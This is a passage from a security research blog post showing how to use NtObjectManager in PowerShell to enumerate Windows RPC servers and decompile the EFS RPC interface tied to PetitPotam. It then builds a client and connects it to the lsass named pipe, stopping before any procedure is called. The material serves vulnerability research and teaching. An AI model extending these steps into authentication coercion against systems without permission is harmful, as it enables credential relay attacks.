</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">Select-RpcServer</span><span class="w"> </span><span class="nt">-SystemHandle</span><span class="w"> </span><span class="nt">-SystemHandleType</span><span class="w">
</span><span class="n">Composition</span><span class="w">  </span><span class="nx">Event</span><span class="w">        </span><span class="nx">File</span><span class="w">         </span><span class="nx">Job</span><span class="w">          </span><span class="nx">Mutex</span><span class="w">        </span><span class="nx">Pipe</span><span class="w">         </span><span class="nx">Process</span><span class="w">      </span><span class="nx">RegKey</span><span class="w">       </span><span class="nx">Section</span><span class="w">      </span><span class="nx">Semaphore</span><span class="w">    </span><span class="nx">Socket</span><span class="w">       </span><span class="nx">Thread</span><span class="w">       </span><span class="nx">Token</span><span class="w">
</span></pre></table></code></div></div><p>The query to find the interfaces that have procedures that accept the selected type:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">Select-RpcServer</span><span class="w"> </span><span class="nt">-SystemHandle</span><span class="w"> </span><span class="nt">-SystemHandleType</span><span class="w"> </span><span class="nx">File</span><span class="w">

</span><span class="n">Name</span><span class="w">             </span><span class="nx">UUID</span><span class="w">                                 </span><span class="nx">Ver</span><span class="w"> </span><span class="nx">Procs</span><span class="w"> </span><span class="nx">EPs</span><span class="w"> </span><span class="nx">Service</span><span class="w">             </span><span class="nx">Running</span><span class="w">
</span><span class="o">----</span><span class="w">             </span><span class="o">----</span><span class="w">                                 </span><span class="o">---</span><span class="w"> </span><span class="o">-----</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="o">-------</span><span class="w">             </span><span class="o">-------</span><span class="w">
</span><span class="n">CmService.dll</span><span class="w">    </span><span class="nx">f1c37891-201f-4aa3-94b1-a5d131b04920</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">46</span><span class="w">    </span><span class="nx">1</span><span class="w">   </span><span class="nx">CmService</span><span class="w">           </span><span class="nx">True</span><span class="w">
</span><span class="n">dnsrslvr.dll</span><span class="w">     </span><span class="nx">45776b01-5956-4485-9f80-f428f7d60129</span><span class="w"> </span><span class="nx">2.0</span><span class="w"> </span><span class="nx">29</span><span class="w">    </span><span class="nx">0</span><span class="w">   </span><span class="nx">Dnscache</span><span class="w">            </span><span class="nx">True</span><span class="w">
</span><span class="n">FrameServer.dll</span><span class="w">  </span><span class="nx">6ddfc7d1-7fca-44eb-a279-e9988f4db32b</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">32</span><span class="w">    </span><span class="nx">0</span><span class="w">   </span><span class="nx">FrameServer</span><span class="w">         </span><span class="nx">False</span><span class="w">
</span><span class="n">PhoneService.dll</span><span class="w"> </span><span class="nx">8be456ec-9244-4d10-88e8-1ddf1baa9ade</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">70</span><span class="w">    </span><span class="nx">0</span><span class="w">   </span><span class="nx">PhoneSvc</span><span class="w">            </span><span class="nx">False</span><span class="w">
</span><span class="n">winhttp.dll</span><span class="w">      </span><span class="nx">3473dd4d-2e88-4006-9cba-22570909dd10</span><span class="w"> </span><span class="nx">5.1</span><span class="w"> </span><span class="nx">12</span><span class="w">    </span><span class="nx">2</span><span class="w">   </span><span class="nx">WinHttpAutoProxySvc</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span></pre></table></code></div></div><p>OK. We can use NtObjectManager to enumerate and discover RPC servers. What else can we do?</p><h3 id="use-ntobjectmanager-to-decomplile-an-idl-file-from-the-efs-rpc-interface-used-in-petitpotam"><span class="mr-2">Use NtObjectManager to decomplile an IDL File from the EFS RPC interface (used in PetitPotam)</span><a href="#use-ntobjectmanager-to-decomplile-an-idl-file-from-the-efs-rpc-interface-used-in-petitpotam" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="from-idl-to-rpc-binary"><span class="mr-2">From IDL to RPC binary</span><a href="#from-idl-to-rpc-binary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>For those of you, like me, new to RPC and its concepts, RPC development (as I have <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/general-build-procedure">read</a>) usually begins with the <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/using-midl#defining-an-interface-with-midl">creation</a> of an interface definition file (IDL). This IDL file is input for the a <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/using-midl#compiling-a-midl-file">MIDL compiler</a> that generates the C/C++ client and server stubs necessary to support the RPC runtime and programming model of RPC.</p><pre><code class="language-mermaid">
flowchart LR;

a[sample.idl] --&gt; b[MIDL Compiler];
b --&gt; c["sample_s.c (server stub)"];
b --&gt; d["sample_c.c (client stub)"];
b --&gt; e[sample.h]

subgraph MIDL output
    c
    d
    e
end

</code></pre><p>The developer then needs to create their client and server code (client.c and server.c) and include the header generated by the MIDL compiler. From there, compile the client and server with the MIDL output, link the RPC runtime libraries, and build the RPC server and client binaries.</p><pre><code class="language-mermaid">
flowchart LR;

a["MIDL Output (.h + stubs)"] --&gt; b[C/C++ Compiler];
b1[server.c] --&gt; b;
b2[procs.c] --&gt; b;
b --&gt; d[Linker];
e[Rpcrt4.lib] --&gt; d;
d --&gt; f[RPCserver.exe];

</code></pre><h4 id="from-rpc-server-to-idl"><span class="mr-2">From RPC server to IDL</span><a href="#from-rpc-server-to-idl" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>In the last post we <a href="https://clearbluejar.github.io/posts/surveying-windows-rpc-discovery-tools/#ntobjectmanager">studied</a> how to dig into those RPC server binaries to find RPC data structures that define interfaces and procedures. From this comes the idea that the original IDL file (that defines the interfaces and procedures) can be recreated (or <em>decompiled</em>) from those data structures.</p><pre><code class="language-mermaid">
flowchart LR;

f[RPCserver.exe] --&gt; g[NDR Parser] --&gt; h[IDL];

</code></pre><p>RpcView uses the data structures (<code class="language-plaintext highlighter-rouge">RPC_SERVET_T</code> <code class="language-plaintext highlighter-rouge">RPC_INTERFACE_T</code>, etc.) to <a href="https://github.com/silverf0x/RpcView/blob/master/RpcView/RpcView.cpp#L122">build</a> out its <a href="https://github.com/silverf0x/RpcView/blob/66288f93663f91ede5143ce20fa556fb5cdcc3dc/RpcDecompiler/RpcDecompiler.h#L46"><code class="language-plaintext highlighter-rouge">RpcDecompilerInfo_T</code></a> used to decompile its IDL files. It isn’t perfect.</p><blockquote><p>When dealing with IDL files generated by RpcView, this kind of error should be expected as the “decompilation” process is not supposed to produce an 100% usable result, straight out of the box. With time and practice though, you can quickly spot these issues and fix them. <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/#:~:text=When%20dealing%20with%20IDL%20files%20generated%20by%20RpcView%2C%20this%20kind%20of%20error%20should%20be%20expected%20as%20the%20%E2%80%9Cdecompilation%E2%80%9D%20process%20is%20not%20supposed%20to%20produce%20an%20100%25%20usable%20result%2C%20straight%20out%20of%20the%20box.%20With%20time%20and%20practice%20though%2C%20you%20can%20quickly%20spot%20these%20issues%20and%20fix%20them.">from-rpcview-to-petitpotam</a></p></blockquote><p>NtObjectManager doesn’t claim to be perfect either.</p><blockquote><p>Even if the decompiler was perfect (and RpcView or my own in my <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools">NtObjectManager</a> PowerShell module are definitely not) the original IDL to NDR compilation process is lossy. Reversing this process with a decompiler doesn’t always produce a 100% correct IDL file and thus the regenerated NDR might not be 100% compatible. <a href="https://www.tiraniddo.dev/2018/11/finding-windows-rpc-client.html">Finding Windows RPC Client Implementations Through Brute Force</a></p></blockquote><p>It does however claim to support a few more of the complex procedure parameters.</p><blockquote><p>However, it’s [RpcView] all written in C/C++ so couldn’t be easily used in a .NET application and the IDL generation is incomplete (such as missing support for system handles and some structure types) and not ideal for our purposes as parsing a text format would be more complicated. <a href="https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html">Calling Local Windows RPC Servers from .NET</a></p></blockquote><p>You can build your own IDL with <code class="language-plaintext highlighter-rouge">Format-RpcServer</code>.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$efsrpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-RpcServer</span><span class="w">
</span><span class="nx">//</span><span class="w"> </span><span class="nx">DllOffset:</span><span class="w"> </span><span class="nx">0x11880</span><span class="w">
</span><span class="n">//</span><span class="w"> </span><span class="nx">DllPath</span><span class="w"> </span><span class="nx">C:\Windows\system32\efslsaext.dll</span><span class="w">
</span><span class="n">//</span><span class="w"> </span><span class="nx">Complex</span><span class="w"> </span><span class="nx">Types:</span><span class="w">
</span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Memory</span><span class="w"> </span><span class="nx">Size:</span><span class="w"> </span><span class="nx">16</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w">
</span><span class="n">struct</span><span class="w"> </span><span class="nx">Struct_0</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">Member0</span><span class="p">;</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">8</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">/</span><span class="o">*</span><span class="w"> </span><span class="nx">C:</span><span class="p">(</span><span class="n">FC_POINTER_CONFORMANCE</span><span class="p">)(</span><span class="mi">0</span><span class="p">)(</span><span class="n">FC_ZERO</span><span class="p">)(</span><span class="n">FC_ULONG</span><span class="p">)(</span><span class="n">Early</span><span class="p">,</span><span class="w"> </span><span class="nx">Range</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">/</span><span class="w"> </span><span class="nx">/</span><span class="o">*</span><span class="w"> </span><span class="nx">unique</span><span class="w"> </span><span class="o">*</span><span class="nx">/struct</span><span class="w"> </span><span class="nx">Struct_1</span><span class="o">*</span><span class="p">[]</span><span class="w"> </span><span class="nx">Member8</span><span class="p">;</span><span class="w">
</span><span class="p">};</span><span class="w">

</span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Memory</span><span class="w"> </span><span class="nx">Size:</span><span class="w"> </span><span class="nx">32</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w">
</span><span class="n">struct</span><span class="w"> </span><span class="nx">Struct_1</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">Member0</span><span class="p">;</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">8</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">/</span><span class="o">*</span><span class="w"> </span><span class="nx">unique</span><span class="w"> </span><span class="o">*</span><span class="nx">/struct</span><span class="w"> </span><span class="nx">Struct_2</span><span class="o">*</span><span class="w"> </span><span class="nx">Member8</span><span class="p">;</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">16</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">/</span><span class="o">*</span><span class="w"> </span><span class="nx">unique</span><span class="w"> </span><span class="o">*</span><span class="nx">/struct</span><span class="w"> </span><span class="nx">Struct_4</span><span class="o">*</span><span class="w"> </span><span class="nx">Member10</span><span class="p">;</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">24</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">/</span><span class="o">*</span><span class="w"> </span><span class="nx">unique</span><span class="w"> </span><span class="o">*</span><span class="nx">/wchar_t</span><span class="o">*</span><span class="w"> </span><span class="nx">Member18</span><span class="p">;</span><span class="w">
</span><span class="p">};</span><span class="w">

</span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Memory</span><span class="w"> </span><span class="nx">Size:</span><span class="w"> </span><span class="nx">8</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w">
</span><span class="n">struct</span><span class="w"> </span><span class="nx">Struct_2</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">sbyte</span><span class="w"> </span><span class="nx">Member0</span><span class="p">;</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">sbyte</span><span class="w"> </span><span class="nx">Member1</span><span class="p">;</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">struct</span><span class="w"> </span><span class="nx">Struct_3</span><span class="w"> </span><span class="nx">Member2</span><span class="p">;</span><span class="w">
    </span><span class="n">/</span><span class="o">*</span><span class="w"> </span><span class="nx">Offset:</span><span class="w"> </span><span class="nx">8</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="w"> </span><span class="nx">/</span><span class="o">*</span><span class="w"> </span><span class="nx">C:</span><span class="p">(</span><span class="n">FC_NORMAL_CONFORMANCE</span><span class="p">)(</span><span class="nt">-7</span><span class="p">)(</span><span class="n">FC_ZERO</span><span class="p">)(</span><span class="n">FC_USMALL</span><span class="p">)(</span><span class="n">Early</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">/</span><span class="w"> </span><span class="nx">int</span><span class="p">[]</span><span class="w"> </span><span class="nx">Member8</span><span class="p">;</span><span class="w">
</span><span class="p">};</span><span class="w">

</span><span class="c">#several lines omitted</span><span class="w">
</span></pre></table></code></div></div><p>I tried compiling it (with the MIDL compiler), but it gave me the same errors that RpcView’s decompiled IDL. The thing about NtObjectManager, although it has the ability to generate IDL files, but it isn’t really necessary when using the tool. The reason being <strong>it can <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/5e00a851f88e735b95f059afd7e27e93f3b11752/NtApiDotNet/Win32/Rpc/RpcClientBuilder.cs#L1375">generate</a> C# RPC clients on the fly</strong>!</p><h3 id="build-a-rpc-client-to-flex-the-efs-rpc-interface"><span class="mr-2">Build a RPC client to flex the EFS RPC interface</span><a href="#build-a-rpc-client-to-flex-the-efs-rpc-interface" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><em>Itm4n</em> walks through the creation of an RPC client <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/#:~:text=Creating%20an%20RPC%20Client%20for%20the%20EFSRPC%20Interface">built with Visual Studio</a>. NtObjectManager obviates that entire step by dynamically building a client from the parsed <code class="language-plaintext highlighter-rouge">NtApiDotNet.Win32.RpcServer</code>. I would explain more of how this dynamic client generation works, but I’m still wrapping my head around this. The <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/5e00a851f88e735b95f059afd7e27e93f3b11752/NtApiDotNet/Win32/Rpc/RpcClientBuilder.cs#L1294">code</a> says it is building (or compiling) a C# <a href="https://docs.microsoft.com/en-us/dotnet/standard/assembly/">assembly</a> in memory. Within it’s <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/5e00a851f88e735b95f059afd7e27e93f3b11752/NtApiDotNet/Win32/Rpc/RpcClientBuilder.cs#L32"><code class="language-plaintext highlighter-rouge">RpcClientBuilder</code></a> class it has reference to the <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/c02ed8ba04324e54a0a188ab9877ee6aa372dfac/NtApiDotNet/Win32/RpcServer.cs#L32"><code class="language-plaintext highlighter-rouge">RpcServer</code></a> containing all the data parsed out from the RpcServer as we walked through before. The <code class="language-plaintext highlighter-rouge">RpcClientBuilder</code> initialization seems to parse out NDR types just as the RpcView decompiler code was doing. After that I get a bit lost, but it seems to dynamically <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/5e00a851f88e735b95f059afd7e27e93f3b11752/NtApiDotNet/Win32/Rpc/RpcClientBuilder.cs#L1036">generate</a> source code and then compile it. Making it immediately <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/25b183136e9a44ed148a0616875d83d785ef46de/NtObjectManager/RpcFunctions.ps1#L565">available</a> in Powershell.</p><p>Accepting I don’t understand it fully, let’s head back to Powershell where we select our server once again.</p><h4 id="building-a-client"><span class="mr-2">Building a client</span><a href="#building-a-client" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The client is built from the parsed RPC server.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$efsrpc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">InterfaceId</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'c681d488-d850-11d0-8c52-00c04fd90f7e'</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$efsrpc</span><span class="w">

</span><span class="n">Name</span><span class="w">          </span><span class="nx">UUID</span><span class="w">                                 </span><span class="nx">Ver</span><span class="w"> </span><span class="nx">Procs</span><span class="w"> </span><span class="nx">EPs</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Running</span><span class="w">
</span><span class="o">----</span><span class="w">          </span><span class="o">----</span><span class="w">                                 </span><span class="o">---</span><span class="w"> </span><span class="o">-----</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="o">-------</span><span class="w"> </span><span class="o">-------</span><span class="w">
</span><span class="n">efslsaext.dll</span><span class="w"> </span><span class="nx">c681d488-d850-11d0-8c52-00c04fd90f7e</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">21</span><span class="w">    </span><span class="nx">0</span><span class="w">           </span><span class="nx">False</span><span class="w">


</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-RpcClient</span><span class="w"> </span><span class="nv">$efsrpc</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="w"> 


</span><span class="n">New</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">_Constructors</span><span class="w">
</span><span class="n">NewArray</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">_Array_Constructors</span><span class="w">
</span><span class="n">Connected</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
</span><span class="n">Endpoint</span><span class="w">         </span><span class="p">:</span><span class="w">
</span><span class="n">ProtocolSequence</span><span class="w"> </span><span class="p">:</span><span class="w">
</span><span class="n">ObjectUuid</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">00000000-0000-0000-0000-000000000000</span><span class="w">
</span><span class="n">InterfaceId</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">c681d488-d850-11d0-8c52-00c04fd90f7e</span><span class="w">
</span><span class="n">InterfaceVersion</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">1.0</span><span class="w">
</span><span class="n">Transport</span><span class="w">        </span><span class="p">:</span><span class="w">
</span></pre></table></code></div></div><p>After the client is built, we need to connect it to the RPC server to call the procedures.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Connect-RpcClient</span><span class="w"> </span><span class="nv">$client</span><span class="w">
</span><span class="n">Exception</span><span class="w"> </span><span class="nx">calling</span><span class="w"> </span><span class="s2">"Connect"</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="s2">"4"</span><span class="w"> </span><span class="nx">argument</span><span class="p">(</span><span class="n">s</span><span class="p">):</span><span class="w"> </span><span class="s2">"Can't find endpoint for c681d488-d850-11d0-8c52-00c04fd90f7e 1.0 with protocol sequence ncalrpc"</span><span class="w">
</span><span class="n">At</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\WindowsPowerShell\Modules\NtObjectManager\1.1.33\NtObjectManager.psm1:14143</span><span class="w"> </span><span class="nx">char:17</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="o">...</span><span class="w">             </span><span class="nv">$Client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$ProtocolSequence</span><span class="p">,</span><span class="w"> </span><span class="nv">$EndpointPath</span><span class="p">,</span><span class="w"> </span><span class="nv">$Networ</span><span class="w"> </span><span class="o">...</span><span class="w">
</span><span class="o">+</span><span class="w">                 </span><span class="n">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">NotSpecified:</span><span class="w"> </span><span class="p">(:)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="n">MethodInvocationException</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">ArgumentException</span><span class="w">
</span></pre></table></code></div></div><p>Well the error is pretty clear. From the <code class="language-plaintext highlighter-rouge">$client</code> output there was no endpoint or protocol derived from the parsing of the RPC server.</p><p>We can cheat for this because we have read <a href="https://twitter.com/itm4n">@itm4n</a> article or have browsed petitpotam code and we know that the efsrpc interface is available here:</p><ul><li>ID of the interface: <code class="language-plaintext highlighter-rouge">c681d488-d850-11d0-8c52-00c04fd90f7e</code><li>Protocol sequence: <code class="language-plaintext highlighter-rouge">ncacn_np</code><li>Name of the endpoint: <code class="language-plaintext highlighter-rouge">\pipe\lsass</code></ul><p>So we try to connect to the client once more, this time passing in the binding information.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Connect-RpcClient</span><span class="w"> </span><span class="nt">-Client</span><span class="w"> </span><span class="nv">$Client</span><span class="w"> </span><span class="nt">-ProtocolSequence</span><span class="w"> </span><span class="nx">ncacn_np</span><span class="w"> </span><span class="nt">-EndpointPath</span><span class="w"> </span><span class="s2">"\pipe\lsass"</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="w">


</span><span class="n">New</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">_Constructors</span><span class="w">
</span><span class="n">NewArray</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">_Array_Constructors</span><span class="w">
</span><span class="n">Connected</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">Endpoint</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">\</span><span class="nf">??</span><span class="nx">\pipe\lsass</span><span class="w">
</span><span class="nx">ProtocolSequence</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">ncacn_np</span><span class="w">
</span><span class="nx">ObjectUuid</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">00000000-0000-0000-0000-000000000000</span><span class="w">
</span><span class="n">InterfaceId</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">c681d488-d850-11d0-8c52-00c04fd90f7e</span><span class="w">
</span><span class="n">InterfaceVersion</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">1.0</span><span class="w">
</span><span class="n">Transport</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">NtApiDotNet.Win32.Rpc.Transport.RpcNamedPipeClientTransport</span><span class="w">



</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">Connected</span><span class="w">
</span><span class="nx">True</span><span class="w">
</span></pre></table></code></div></div><p>You have to admit, if you are going for speed, you would use NtObjectManager instead of Visual Studio to build your client. :)</p><h4 id="flexing-the-interface-to-call-the-procedure"><span class="mr-2">Flexing the interface to call the procedure</span><a href="#flexing-the-interface-to-call-the-procedure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>OK, now we have a connected RPC client. What procedures are available?</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">gm</span><span class="w">


   </span><span class="n">TypeName:</span><span class="w"> </span><span class="nx">Client</span><span class="w">

</span><span class="n">Name</span><span class="w">                                        </span><span class="nx">MemberType</span><span class="w"> </span><span class="nx">Definition</span><span class="w">
</span><span class="o">----</span><span class="w">                                        </span><span class="o">----------</span><span class="w"> </span><span class="o">----------</span><span class="w">
</span><span class="n">Connect</span><span class="w">                                     </span><span class="nx">Method</span><span class="w">     </span><span class="nx">void</span><span class="w"> </span><span class="nx">Connect</span><span class="p">(</span><span class="n">NtApiDotNet.Win32.RpcEndpoint</span><span class="w"> </span><span class="nx">endpoint</span><span class="p">,</span><span class="w"> </span><span class="nx">NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity</span><span class="w"> </span><span class="nx">transport_security</span><span class="p">),</span><span class="w"> </span><span class="n">vo...</span><span class="w">
</span><span class="nx">Disconnect</span><span class="w">                                  </span><span class="nx">Method</span><span class="w">     </span><span class="nx">void</span><span class="w"> </span><span class="nx">Disconnect</span><span class="p">()</span><span class="w">
</span><span class="n">Dispose</span><span class="w">                                     </span><span class="nx">Method</span><span class="w">     </span><span class="nx">void</span><span class="w"> </span><span class="nx">Dispose</span><span class="p">(),</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="nx">IDisposable.Dispose</span><span class="p">()</span><span class="w">
